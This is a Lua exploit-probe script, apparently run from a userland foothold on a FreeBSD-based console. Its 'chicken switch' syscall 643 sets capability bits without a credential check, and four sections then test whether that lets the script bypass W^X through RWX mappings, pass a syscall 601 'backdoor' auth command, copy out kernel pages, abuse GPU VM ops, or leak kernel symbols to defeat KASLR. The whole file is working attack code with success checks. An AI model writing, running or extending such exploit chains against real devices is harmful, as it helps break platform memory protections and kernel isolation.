-- CRASH_CLASS: MODERATE
-- PROBE 102a: Combined chain — chicken switches + untested paths
--
-- Context: Probe 55a confirmed sys 643 sets ALL 32 bits in process+0xa34
-- with NO credential check (returns 0 for every bit). But 55a ONLY retested
-- mprotect(RWX) and fork afterward — both still blocked.
--
-- CRITICAL GAP: The following paths were NEVER tested after chicken bits:
--   - sys 628 (mmap variant with inverse auth gates) — NEVER TESTED AT ALL
--   - sys 601 (process control multiplexer) — tested before chicken bits only
--   - sys 654/655/657 (GPU VM range ops) — NEVER TESTED AT ALL
--   - kldstat(308)/kldsym(309) — never tested after chicken bits
--   - sys 548 (batch VM ops) — returned -1 before chicken bits
--
-- The chicken switch field process+0xa34 may be checked by these different
-- code paths in ways that mprotect/fork don't check. The PPR PFS mount code
-- in the same page suggests these are game process capability flags.
--
-- Combined chain hypothesis: chicken switches + sys 628 RWX = W^X bypass
--
-- Section A: Set chicken bits + sys 628 mmap RWX test
-- Section B: Set chicken bits + sys 601 cmds retest (init/backdoor/write/copyout)
-- Section C: Set chicken bits + GPU VM ops (654/655/657)
-- Section D: Set chicken bits + kldstat/kldsym + sys 548 batch VM

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 102a: CHICKEN SWITCH COMBINED CHAIN ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc643 = make_syscall(643)  -- set_chicken_switches
local sc624 = make_syscall(624)  -- baseline VM counter

local function set_chicken_bits()
    print("[CHICKEN] Setting all 32 bits via sys 643...")
    local ok, rv = pcall(function() return sc643(uint64(0xFFFFFFFF)) end)
    print("  sys 643(0xFFFFFFFF): ret=" .. (ok and fmt(rv) or "FAIL"))
    return ok and to_num(rv) == 0
end

if TEST_SECTION == "A" then
    print("--- Section A: Chicken switches + sys 628 mmap RWX ---")
    print("  Hypothesis: chicken bits may disable W^X check in sys 628 code path")
    print("")

    -- Step 1: Baseline sys 628 WITHOUT chicken bits
    local sc628 = make_syscall(628)

    print("[A1] BEFORE chicken bits — sys 628 RWX test:")
    local ok1, rv1 = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x13), uint64(0), uint64(0))
    end)
    print("  sys 628 prot=0x13(RWX): ret=" .. (ok1 and fmt(rv1) or "PCALL-FAIL"))

    -- Also test RW (should be more likely to work)
    local ok1b, rv1b = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x03), uint64(0), uint64(0))
    end)
    print("  sys 628 prot=0x03(RW):  ret=" .. (ok1b and fmt(rv1b) or "PCALL-FAIL"))

    -- Also test X-only
    local ok1c, rv1c = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x10), uint64(0), uint64(0))
    end)
    print("  sys 628 prot=0x10(X):   ret=" .. (ok1c and fmt(rv1c) or "PCALL-FAIL"))
    print("")

    -- Step 2: Set chicken bits
    local bits_set = set_chicken_bits()
    if not bits_set then
        print("  *** CHICKEN BITS FAILED — cannot continue ***")
        print("[DONE] Section A aborted")
        return
    end
    print("")

    -- Step 3: AFTER chicken bits — sys 628 RWX test
    print("[A2] AFTER chicken bits — sys 628 RWX test:")
    local ok2, rv2 = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x13), uint64(0), uint64(0))
    end)
    print("  sys 628 prot=0x13(RWX): ret=" .. (ok2 and fmt(rv2) or "PCALL-FAIL"))

    local ok2b, rv2b = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x03), uint64(0), uint64(0))
    end)
    print("  sys 628 prot=0x03(RW):  ret=" .. (ok2b and fmt(rv2b) or "PCALL-FAIL"))

    local ok2c, rv2c = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x10), uint64(0), uint64(0))
    end)
    print("  sys 628 prot=0x10(X):   ret=" .. (ok2c and fmt(rv2c) or "PCALL-FAIL"))
    print("")

    -- Check if any result CHANGED
    local before_rwx = ok1 and fmt(rv1) or "FAIL"
    local after_rwx = ok2 and fmt(rv2) or "FAIL"
    if before_rwx ~= after_rwx then
        print("  *** RWX RESULT CHANGED AFTER CHICKEN BITS ***")
        print("  Before: " .. before_rwx)
        print("  After:  " .. after_rwx)
    end

    -- If any mapping succeeded, try read/write
    if ok2 then
        local h2, l2 = get_hi_lo(rv2)
        if h2 ~= 0xFFFFFFFF and l2 ~= 0xFFFFFFFF and (h2 ~= 0 or l2 > 100) then
            print("[A3] RWX mapping returned address — testing R/W:")
            local rd = safe_rd(rv2)
            local wr = safe_wd(rv2, 0xDEADBEEF)
            print("  read=" .. (rd and "OK" or "FAIL") .. " write=" .. (wr and "OK" or "FAIL"))
            if wr then
                print("  *** WRITABLE RWX PAGE! W^X BYPASS CONFIRMED! ***")
            end
        end
    end
    if ok2b then
        local h2b, l2b = get_hi_lo(rv2b)
        if h2b ~= 0xFFFFFFFF and l2b ~= 0xFFFFFFFF and (h2b ~= 0 or l2b > 100) then
            print("[A3b] RW mapping returned address — testing:")
            local rd = safe_rd(rv2b)
            local wr = safe_wd(rv2b, 0xCAFEBABE)
            print("  read=" .. (rd and "OK" or "FAIL") .. " write=" .. (wr and "OK" or "FAIL"))
        end
    end
    print("")

    -- Also retest mprotect with sys 628 mapped pages
    print("[A4] Retest mprotect(RWX) on sys 628 page (if mapped):")
    local sc74 = make_syscall(74)  -- mprotect
    if ok2b then
        local h, l = get_hi_lo(rv2b)
        if h ~= 0xFFFFFFFF and l ~= 0xFFFFFFFF and (h ~= 0 or l > 100) then
            local ok_mp, rv_mp = pcall(function()
                return sc74(rv2b, uint64(0x4000), uint64(7))  -- PROT_RWX
            end)
            print("  mprotect(RWX) on 628 page: ret=" .. (ok_mp and fmt(rv_mp) or "PCALL-FAIL"))
        end
    end
    print("")

    -- Stability
    print("[A5] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Chicken switches + sys 601 retest ---")
    print("  55d showed cmd 0x00=0x100, cmds 0x0c/0x10/0x12 failed (-1)")
    print("  Chicken bits may change the init/auth state that these commands check")
    print("")

    local sc601 = make_syscall(601)
    local buf = memory.alloc(0x2000)

    -- Step 1: Baseline WITHOUT chicken bits
    print("[B1] BEFORE chicken bits — sys 601 key commands:")

    -- cmd 0x00 (state query)
    for i = 0, 7 do safe_wd(buf + i * 4, 0) end
    local ok0, rv0 = pcall(function() return sc601(uint64(0), uint64(buf)) end)
    local state = safe_rd(buf) or 0
    print(string.format("  cmd 0x00: ret=%s state=0x%X",
        ok0 and fmt(rv0) or "FAIL", state))

    -- cmd 0x01 (init)
    local ok1, rv1 = pcall(function() return sc601(uint64(1), uint64(buf)) end)
    print("  cmd 0x01 (init): ret=" .. (ok1 and fmt(rv1) or "FAIL"))

    -- cmd 0x0c (backdoor)
    for i = 0, 63 do safe_wd(buf + i * 4, 0) end
    memory.write_byte(buf, 0xCD)
    memory.write_byte(buf + 1, 0x41)
    local okc, rvc = pcall(function() return sc601(uint64(0x0C), uint64(buf), uint64(buf + 0x100)) end)
    print("  cmd 0x0c (auth): ret=" .. (okc and fmt(rvc) or "FAIL"))

    -- cmd 0x10 (kernel page copyout)
    local ok10, rv10 = pcall(function() return sc601(uint64(0x10), uint64(buf)) end)
    print("  cmd 0x10 (copyout): ret=" .. (ok10 and fmt(rv10) or "FAIL"))

    -- cmd 0x12 (process write)
    local ok12, rv12 = pcall(function() return sc601(uint64(0x12), uint64(0), uint64(0)) end)
    print("  cmd 0x12 (write): ret=" .. (ok12 and fmt(rv12) or "FAIL"))
    print("")

    -- Step 2: Set chicken bits
    set_chicken_bits()
    print("")

    -- Step 3: AFTER chicken bits
    print("[B2] AFTER chicken bits — sys 601 retest:")

    -- cmd 0x00 (state query - check if state changed)
    for i = 0, 7 do safe_wd(buf + i * 4, 0) end
    local ok0b, rv0b = pcall(function() return sc601(uint64(0), uint64(buf)) end)
    local state2 = safe_rd(buf) or 0
    print(string.format("  cmd 0x00: ret=%s state=0x%X%s",
        ok0b and fmt(rv0b) or "FAIL", state2,
        state2 ~= state and " *** STATE CHANGED ***" or ""))

    -- cmd 0x01 (init - might succeed now)
    local ok1b, rv1b = pcall(function() return sc601(uint64(1), uint64(buf)) end)
    print("  cmd 0x01 (init): ret=" .. (ok1b and fmt(rv1b) or "FAIL") ..
        (ok1b and to_num(rv1b) == 0 and " *** NOW WORKS ***" or ""))

    -- cmd 0x0c (backdoor - might pass now)
    for i = 0, 63 do safe_wd(buf + i * 4, 0) end
    memory.write_byte(buf, 0xCD)
    memory.write_byte(buf + 1, 0x41)
    local okcb, rvcb = pcall(function() return sc601(uint64(0x0C), uint64(buf), uint64(buf + 0x100)) end)
    print("  cmd 0x0c (auth): ret=" .. (okcb and fmt(rvcb) or "FAIL") ..
        (okcb and to_num(rvcb) == 0 and " *** AUTH PASSED ***" or ""))

    -- cmd 0x10 (kernel page copyout - might work now)
    for i = 0, 0x3FF do safe_wd(buf + i * 4, 0) end
    local ok10b, rv10b = pcall(function() return sc601(uint64(0x10), uint64(buf)) end)
    print("  cmd 0x10 (copyout): ret=" .. (ok10b and fmt(rv10b) or "FAIL"))
    if ok10b and to_num(rv10b) == 0 then
        print("  *** KERNEL PAGE COPYOUT NOW WORKS! ***")
        local nonzero = 0
        for i = 0, 0x3FF do
            local v = safe_rd(buf + i * 4) or 0
            if v ~= 0 then nonzero = nonzero + 1 end
        end
        print("  nonzero dwords: " .. nonzero)
        -- Scan for kernel pointers
        for i = 0, 0x1FF do
            local q = safe_rq(buf + i * 8)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    print(string.format("  *** KERNEL PTR at +0x%03X: %s ***", i * 8, fmt(q)))
                end
            end
        end
    end

    -- cmd 0x12 (process write - might work now)
    local ok12b, rv12b = pcall(function() return sc601(uint64(0x12), uint64(0), uint64(0x42)) end)
    print("  cmd 0x12 (write): ret=" .. (ok12b and fmt(rv12b) or "FAIL") ..
        (ok12b and to_num(rv12b) == 0 and " *** WRITE ACCEPTED ***" or ""))
    print("")

    -- Stability
    print("[B3] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: Chicken switches + GPU VM range ops ---")
    print("  sys 654/655/657 require type-11 object (GPU mmap)")
    print("  Chicken bits may affect the entry flag +0x60 &2 check")
    print("")

    -- GPU mmap first
    local sc477 = make_syscall(477)
    print("[C0] Create GPU mmap page:")
    local ok_gpu, gpu = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_gpu then
        print("  GPU mmap FAIL — cannot continue")
        print("[DONE] Section C aborted")
        return
    end
    print("  GPU page: " .. fmt(gpu))
    print("")

    local sc654 = make_syscall(654)
    local sc655 = make_syscall(655)
    local sc657 = make_syscall(657)

    -- Step 1: BEFORE chicken bits
    print("[C1] BEFORE chicken bits — GPU VM ops:")

    -- sys 654: single range op (address, length, operation, flags, reserved=0)
    local ok654, rv654 = pcall(function()
        return sc654(gpu, uint64(0x4000), uint64(0), uint64(0), uint64(0))
    end)
    print("  sys 654 op=0: ret=" .. (ok654 and fmt(rv654) or "PCALL-FAIL"))

    -- sys 655: range reset (address, length, reserved=0)
    local ok655, rv655 = pcall(function()
        return sc655(gpu, uint64(0x4000), uint64(0))
    end)
    print("  sys 655 reset: ret=" .. (ok655 and fmt(rv655) or "PCALL-FAIL"))

    -- sys 657: batched (record_ptr, count, processed_out, flags=0)
    local rec_buf = memory.alloc(0x100)
    local proc_buf = memory.alloc(8)
    -- Build one 0x20-byte record: opcode=1, address, length, protection
    safe_wq(rec_buf, uint64(1))          -- opcode
    safe_wq(rec_buf + 8, gpu)            -- address
    safe_wq(rec_buf + 0x10, uint64(0x4000))  -- length
    safe_wq(rec_buf + 0x18, uint64(0x33))    -- protection
    safe_wd(proc_buf, 0)

    local ok657, rv657 = pcall(function()
        return sc657(uint64(rec_buf), uint64(1), uint64(proc_buf), uint64(0))
    end)
    print("  sys 657 batch: ret=" .. (ok657 and fmt(rv657) or "PCALL-FAIL"))
    print("")

    -- Step 2: Set chicken bits
    set_chicken_bits()
    print("")

    -- Step 3: AFTER chicken bits
    print("[C2] AFTER chicken bits — GPU VM ops retest:")

    local ok654b, rv654b = pcall(function()
        return sc654(gpu, uint64(0x4000), uint64(0), uint64(0), uint64(0))
    end)
    print("  sys 654 op=0: ret=" .. (ok654b and fmt(rv654b) or "PCALL-FAIL"))

    -- Try exec-related operations
    for op = 0, 5 do
        local ok_op, rv_op = pcall(function()
            return sc654(gpu, uint64(0x4000), uint64(op), uint64(0x10), uint64(0))
        end)
        print(string.format("  sys 654 op=%d flags=0x10: ret=%s%s", op,
            ok_op and fmt(rv_op) or "PCALL-FAIL",
            ok_op and to_num(rv_op) == 0 and " *** SUCCESS ***" or ""))
    end

    local ok655b, rv655b = pcall(function()
        return sc655(gpu, uint64(0x4000), uint64(0))
    end)
    print("  sys 655 reset: ret=" .. (ok655b and fmt(rv655b) or "PCALL-FAIL"))

    -- Batch with exec protection
    safe_wq(rec_buf, uint64(1))
    safe_wq(rec_buf + 8, gpu)
    safe_wq(rec_buf + 0x10, uint64(0x4000))
    safe_wq(rec_buf + 0x18, uint64(0x37))  -- RWX-like (0x33 + exec)
    safe_wd(proc_buf, 0)
    local ok657b, rv657b = pcall(function()
        return sc657(uint64(rec_buf), uint64(1), uint64(proc_buf), uint64(0))
    end)
    local proc_count = safe_rd(proc_buf) or 0
    print("  sys 657 batch(RWX): ret=" .. (ok657b and fmt(rv657b) or "PCALL-FAIL") ..
        " processed=" .. proc_count)
    print("")

    -- Check for any changes
    local changed = false
    if ok654 and ok654b then
        if fmt(rv654) ~= fmt(rv654b) then changed = true end
    end
    if changed then
        print("  *** BEHAVIOR CHANGED AFTER CHICKEN BITS ***")
    end

    -- Stability
    print("[C3] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Chicken switches + kldstat/kldsym + batch VM ---")
    print("")

    local sc308 = make_syscall(308)  -- kldstat
    local sc309 = make_syscall(309)  -- kldsym
    local sc548 = make_syscall(548)  -- batch VM ops

    -- Step 1: BEFORE chicken bits
    print("[D1] BEFORE chicken bits:")

    -- kldstat(308): arg0=fileid(1), arg1=stat_struct
    local stat_buf = memory.alloc(0x200)
    safe_wd(stat_buf, 0x148)  -- struct size
    local ok308, rv308 = pcall(function()
        return sc308(uint64(1), uint64(stat_buf))
    end)
    print("  kldstat(1): ret=" .. (ok308 and fmt(rv308) or "PCALL-FAIL"))

    -- kldsym(309): arg0=fileid(0), arg1=KLDSYM_LOOKUP(1), arg2=lookup_struct
    local sym_buf = memory.alloc(0x100)
    -- Write "kernel" string
    local sym_name = "printf"
    local name_buf = memory.alloc(0x40)
    for i = 1, #sym_name do
        memory.write_byte(name_buf + i - 1, string.byte(sym_name, i))
    end
    memory.write_byte(name_buf + #sym_name, 0)
    safe_wq(sym_buf, uint64(0))        -- version
    safe_wq(sym_buf + 8, uint64(name_buf)) -- symname
    safe_wq(sym_buf + 16, uint64(0))   -- symvalue (output)

    local ok309, rv309 = pcall(function()
        return sc309(uint64(0), uint64(1), uint64(sym_buf))
    end)
    print("  kldsym(0,'printf'): ret=" .. (ok309 and fmt(rv309) or "PCALL-FAIL"))
    if ok309 and to_num(rv309) == 0 then
        local sym_val = safe_rq(sym_buf + 16)
        if sym_val then
            local sh, sl = get_hi_lo(sym_val)
            print(string.format("  *** SYMBOL VALUE: %s ***", fmt(sym_val)))
            if sh >= 0xFFFF8000 then
                print("  *** KERNEL ADDRESS — KASLR DEFEATED! ***")
            end
        end
    end

    -- sys 548 batch VM: ops_ptr, count, processed_out
    local vm_buf = memory.alloc(0x100)
    safe_wq(vm_buf, uint64(0))           -- opcode 0 (new mapping)
    safe_wq(vm_buf + 8, uint64(0))       -- address
    safe_wq(vm_buf + 0x10, uint64(0x4000)) -- length
    safe_wq(vm_buf + 0x18, uint64(0x33)) -- protection
    local proc_buf = memory.alloc(8)
    safe_wd(proc_buf, 0)

    local ok548, rv548 = pcall(function()
        return sc548(uint64(vm_buf), uint64(1), uint64(proc_buf))
    end)
    print("  sys 548 batch: ret=" .. (ok548 and fmt(rv548) or "PCALL-FAIL"))
    print("")

    -- Step 2: Set chicken bits
    set_chicken_bits()
    print("")

    -- Step 3: AFTER chicken bits
    print("[D2] AFTER chicken bits:")

    safe_wd(stat_buf, 0x148)
    local ok308b, rv308b = pcall(function()
        return sc308(uint64(1), uint64(stat_buf))
    end)
    print("  kldstat(1): ret=" .. (ok308b and fmt(rv308b) or "PCALL-FAIL"))
    if ok308b and to_num(rv308b) == 0 then
        print("  *** KLDSTAT NOW WORKS! ***")
        -- Read module info
        local name_off = stat_buf + 4
        local name_bytes = {}
        for j = 0, 15 do
            local b = safe_rd(name_off + j) or 0
            local c = b % 256
            if c >= 32 and c <= 126 then
                table.insert(name_bytes, string.char(c))
            else break end
        end
        print("  name: " .. table.concat(name_bytes))
    end

    -- kldsym retest
    safe_wq(sym_buf + 16, uint64(0))
    local ok309b, rv309b = pcall(function()
        return sc309(uint64(0), uint64(1), uint64(sym_buf))
    end)
    print("  kldsym(0,'printf'): ret=" .. (ok309b and fmt(rv309b) or "PCALL-FAIL"))
    if ok309b and to_num(rv309b) == 0 then
        local sym_val = safe_rq(sym_buf + 16)
        if sym_val then
            print(string.format("  *** SYMBOL VALUE: %s ***", fmt(sym_val)))
            local sh, sl = get_hi_lo(sym_val)
            if sh >= 0xFFFF8000 then
                print("  *** KASLR DEFEATED VIA KLDSYM! ***")
            end
        end
    end

    -- sys 548 retest
    safe_wd(proc_buf, 0)
    local ok548b, rv548b = pcall(function()
        return sc548(uint64(vm_buf), uint64(1), uint64(proc_buf))
    end)
    local processed = safe_rd(proc_buf) or 0
    print("  sys 548 batch: ret=" .. (ok548b and fmt(rv548b) or "PCALL-FAIL") ..
        " processed=" .. processed)
    if ok548b and to_num(rv548b) == 0 and processed > 0 then
        print("  *** BATCH VM OPS NOW WORK! ***")
    end
    print("")

    -- Stability
    print("[D3] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 102a COMPLETE ===")
